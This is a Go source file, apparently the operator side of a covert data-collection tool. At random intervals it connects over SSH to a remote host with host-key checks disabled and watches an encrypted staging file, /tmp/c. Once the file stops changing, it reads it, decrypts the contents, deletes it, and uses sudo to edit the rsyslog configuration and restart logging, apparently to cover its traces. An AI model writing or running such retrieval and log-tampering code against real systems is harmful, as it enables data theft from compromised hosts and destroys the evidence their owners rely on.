package checkactive

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand/v2"
	"strings"
	check "test/client/CHECK"
	"test/vars"
	"time"

	"golang.org/x/crypto/ssh"
)

var found = true
var prevCur int64 = 0

func Checkactive(conf vars.Config) {
	for { //BUG MAKE it witrh stdin write i supose
		if found {
			config := &ssh.ClientConfig{
				User: conf.Client.User,
				Auth: []ssh.AuthMethod{
					ssh.Password(conf.Client.Pass),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			}

			// Connect to the remote host
			hostPort := fmt.Sprintf("%s:%s", conf.Client.Host, conf.Client.Port)
			client, err := ssh.Dial("tcp", hostPort, config)
			if err != nil {
				log.Fatalf("Failed to dial: %s", err)
			}
			session, err := client.NewSession()
			if err != nil {
				log.Fatalf("Failed to create session: %s", err)
			}

			fmt.Println(string(vars.Yellow), "Checking", string(vars.Reset))
			output, err := session.Output("stat -c %x /tmp/c")
			if err != nil {
				check.Check("Error Sending Command", err)
			}
			timestamp := strings.TrimSpace(string(output))

			layout := "2006-01-02 15:04:05.999999999 -0700"
			parsedTime, err := time.Parse(layout, timestamp)
			if err != nil {
				fmt.Println(err, "Error parsing time")
			}
			epochTime := parsedTime.Unix()

			if prevCur < epochTime {
				fmt.Println(string(vars.Blue), "Still Scanning", string(vars.Reset))
				prevCur = epochTime
			} else if epochTime == prevCur {
				fmt.Println(string(vars.Green), "END RETRIEVE", string(vars.Reset))

				found = false
				session.Close()
				client.Close()
				client, err := ssh.Dial("tcp", hostPort, config)
				if err != nil {
					log.Fatalf("Failed to dial: %s", err)
				}
				session, err := client.NewSession()
				if err != nil {
					log.Fatalf("Failed to create session: %s", err)
				}

				output, err := session.Output("cat /tmp/c")
				if err != nil {
					fmt.Println(err, "Error retrieving file contents")
				}
				fmt.Println(string(output))

				session.Close()
				client.Close()
				decStr, err := decrypt(string(output), []byte(conf.Flags.Key))

				if err != nil {
					fmt.Println("error on decrypt", err)
				}
				fmt.Println(decStr, "ASDSSADASDSAFDSADGAFDJGADFJGTADI")
				client, err = ssh.Dial("tcp", hostPort, config)
				if err != nil {
					log.Fatalf("Failed to dial: %s", err)
				}
				session, err = client.NewSession()
				if err != nil {
					log.Fatalf("Failed to create session: %s", err)
				}

				_, err = session.Output("rm /tmp/c \n")
				if err != nil {
					fmt.Println(err, "Error removing file")
				}
				session.Close()
				client.Close()
				client, err = ssh.Dial("tcp", hostPort, config)
				if err != nil {
					log.Fatalf("Failed to dial: %s", err)
				}
				session, err = client.NewSession()
				if err != nil {
					log.Fatalf("Failed to create session: %s", err)
				}
				_, err = session.Output(fmt.Sprintf("bash -c 'echo %s | sudo -S sed -i \"1d\" /etc/rsyslog.d/50-default.conf' \n ", conf.Client.Pass))
				if err != nil {
					fmt.Println(err, "Error editing file")
				}
				session.Close()
				client.Close()
				client, err = ssh.Dial("tcp", hostPort, config)
				if err != nil {
					log.Fatalf("Failed to dial: %s", err)
				}
				session, err = client.NewSession()
				if err != nil {
					log.Fatalf("Failed to create session: %s", err)
				}
				_, err = session.Output(fmt.Sprintf("bash -c 'echo %s | sudo -S systemctl restart rsyslog ' \n ", conf.Client.Pass))
				if err != nil {
					fmt.Println(err, "Error restarting rsyslog")
				}
				session.Close()
				client.Close()
			}
			session.Close()
			client.Close()
			time.Sleep(time.Duration(rand.IntN(conf.Flags.RundomTimeSec)) * time.Second)
		} else {
			fmt.Println("END")
			break
		}
	}
}

func decrypt(cipherT string, key []byte) ([]string, error) {
	// Decode the hex string back to byte slice
	list := strings.Split(cipherT, "\n")

	decodeList := []string{}

	for _, l := range list {
		if len(l) != 0 {
			fmt.Println(len(l), "AAAAAAAAAAAAAAAAAAAAAA<<<<<<<<<<<<<<<<<<<<<")
			s := strings.TrimSpace(l)
			cipherText, err := hex.DecodeString(s)
			if err != nil {
				return []string{}, err
			}

			// Create a new AES cipher block
			block, err := aes.NewCipher(key)
			if err != nil {
				return []string{}, err
			}

			// Use GCM mode
			aesGCM, err := cipher.NewGCM(block)
			if err != nil {
				return []string{}, err
			}

			// Extract the nonce size from GCM
			nonceSize := aesGCM.NonceSize()

			// Split the nonce and ciphertext
			nonce, cipherText := cipherText[:nonceSize], cipherText[nonceSize:]

			// Decrypt the ciphertext
			plainText, err := aesGCM.Open(nil, nonce, cipherText, nil)
			if err != nil {
				return []string{}, err
			}

			decodeList = append(decodeList, string(plainText))
		}
	}
	// Return the decrypted plaintext as a string
	return decodeList, nil
}
